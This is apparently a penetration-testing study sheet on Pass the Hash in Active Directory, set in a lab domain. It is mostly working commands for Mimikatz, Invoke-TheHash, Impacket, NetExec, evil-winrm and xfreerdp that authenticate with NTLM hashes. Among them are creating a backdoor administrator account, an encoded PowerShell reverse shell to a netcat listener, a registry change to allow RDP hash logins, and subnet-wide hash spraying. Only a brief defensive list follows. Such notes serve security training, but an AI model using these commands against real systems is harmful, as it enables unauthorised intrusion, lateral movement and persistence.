# Pass the Hash (PtH)

## 1. Pass the Hash Overview

**Pass the Hash (PtH)** is an attack technique that allows authentication to a system **using an NTLM hash directly**, without knowing the plaintext password.

* Works due to NTLM challenge–response authentication
* NTLM hashes are **static**
* Extremely effective in poorly hardened Active Directory environments

---

## 2. Prerequisites

* Prior acquisition of an **NTLM hash**
* The account used must have **administrative privileges** on the target (local or domain)

Common hash sources:

* Local SAM database
* `ntds.dit` (Domain Controller)
* Memory (`lsass.exe`)

---

## 3. Pass the Hash on Windows

### 3.1 Mimikatz — sekurlsa::pth

```cmd
mimikatz.exe privilege::debug ^
"sekurlsa::pth /user:julio /rc4:64F12CDDAA88057E06A81B54E73B949B /domain:inlanefreight.htb /run:cmd.exe" ^
exit
```

Notes:

* Launches a **new process** under the target user context
* Injects the NTLM hash into the session
* No plaintext password required
* Allows access to authorized network resources (SMB shares, etc.)

---

### 3.2 Invoke-TheHash (PowerShell)

#### Module Import

```powershell
cd C:\tools\Invoke-TheHash
Import-Module .\Invoke-TheHash.psd1
```

Note:

* Required once per PowerShell session

---

#### Command Execution via SMB

```powershell
Invoke-SMBExec `
  -Target 172.16.1.10 `
  -Domain inlanefreight.htb `
  -Username julio `
  -Hash 64F12CDDAA88057E06A81B54E73B949B `
  -Command "net user mark Password123 /add && net localgroup administrators mark /add" `
  -Verbose
```

Notes:

* Uses SMB + Service Control Manager
* The account must be **local admin on the target**
* Creates a temporary service to execute commands
* Very noisy (highly detectable)

---

#### Command Execution via WMI

```powershell
Invoke-WMIExec `
  -Target DC01 `
  -Domain inlanefreight.htb `
  -Username julio `
  -Hash 64F12CDDAA88057E06A81B54E73B949B `
  -Command "whoami"
```

Notes:

* More stealthy than SMBExec
* Uses WMI
* No service creation

---

### 3.3 Reverse Shell via Invoke-TheHash

#### Netcat Listener (attacker)

```powershell
nc.exe -lvnp 8001
```

Note:

* Must be running before triggering the payload

---

#### Reverse Shell Execution (WMI)

```powershell
Invoke-WMIExec `
  -Target DC01 `
  -Domain inlanefreight.htb `
  -Username julio `
  -Hash 64F12CDDAA88057E06A81B54E73B949B `
  -Command "powershell -e <BASE64_PAYLOAD>"
```

Notes:

* PowerShell payload encoded in Base64
* Provides an interactive remote shell
* Common post-exploitation technique

---

### 3.4 Enable Restricted Admin Mode (RDP PtH)

```cmd
reg add HKLM\System\CurrentControlSet\Control\Lsa ^
/t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

Notes:

* Required for Pass the Hash via RDP
* Requires local administrator privileges
* Changes RDP authentication behavior

---

## 4. Pass the Hash on Linux

### 4.1 Impacket — PsExec

```bash
impacket-psexec administrator@10.129.201.126 \
-hashes :30B3783CE2ABF1AF70F77D0660CF3453
```

Notes:

* Uploads an executable via SMB
* Creates a Windows service
* Opens an interactive shell
* Very effective but noisy

---

### 4.2 Impacket — Other Useful Tools

```bash
impacket-wmiexec administrator@10.129.201.126 -hashes :<NTLM>
```

```bash
impacket-smbexec administrator@10.129.201.126 -hashes :<NTLM>
```

```bash
impacket-atexec administrator@10.129.201.126 -hashes :<NTLM>
```

Notes:

* `wmiexec`: stealthier
* `smbexec`: PsExec-like behavior
* `atexec`: uses the Task Scheduler

---

### 4.3 NetExec — Authentication and Scanning

#### Test the hash across a subnet

```bash
netexec smb 172.16.1.0/24 \
-u Administrator -d . \
-H 30B3783CE2ABF1AF70F77D0660CF3453
```

Notes:

* Tests the hash against multiple hosts
* `Pwn3d!` indicates confirmed local admin access
* Useful for detecting password reuse

---

#### Local authentication (password reuse check)

```bash
netexec smb 172.16.1.0/24 \
-u Administrator \
-H 30B3783CE2ABF1AF70F77D0660CF3453 \
--local-auth
```

Notes:

* Avoids domain account lockouts
* Common after dumping a local SAM

---

#### Command execution

```bash
netexec smb 10.129.201.126 \
-u Administrator -d . \
-H 30B3783CE2ABF1AF70F77D0660CF3453 \
-x whoami
```

---

### 4.4 evil-winrm

```bash
evil-winrm -i 10.129.201.126 \
-u Administrator \
-H 30B3783CE2ABF1AF70F77D0660CF3453
```

Notes:

* Uses WinRM / PowerShell Remoting
* Very stable
* Less noisy than SMB-based execution

Domain account:

```bash
evil-winrm -i 10.129.201.126 \
-u administrator@inlanefreight.htb \
-H <NTLM_HASH>
```

---

### 4.5 RDP — Pass the Hash

```bash
xfreerdp /v:10.129.201.126 \
/u:julio \
/pth:64F12CDDAA88057E06A81B54E73B949B
```

Notes:

* Provides full GUI access
* Requires Restricted Admin Mode
* Powerful but highly visible

---

## 5. UAC Limitations (Local Accounts)

* `LocalAccountTokenFilterPolicy = 0`
  → only the **Administrator (RID 500)** account can perform remote PtH

* `LocalAccountTokenFilterPolicy = 1`
  → all local admins are allowed

* If `FilterAdministratorToken = 1`
  → even RID 500 is blocked

Note:

* These restrictions **do not apply to domain accounts**

---

## 6. Post-Exploitation Verification Commands

```cmd
whoami
```

```cmd
whoami /groups
```

```cmd
dir \\DC01\C$
```

```cmd
net use
```

---

## 7. Defensive Considerations

* Disable NTLM where possible
* Deploy **LAPS**
* Restrict WinRM and SMB access
* Monitor NTLM authentication events
* Enable Credential Guard
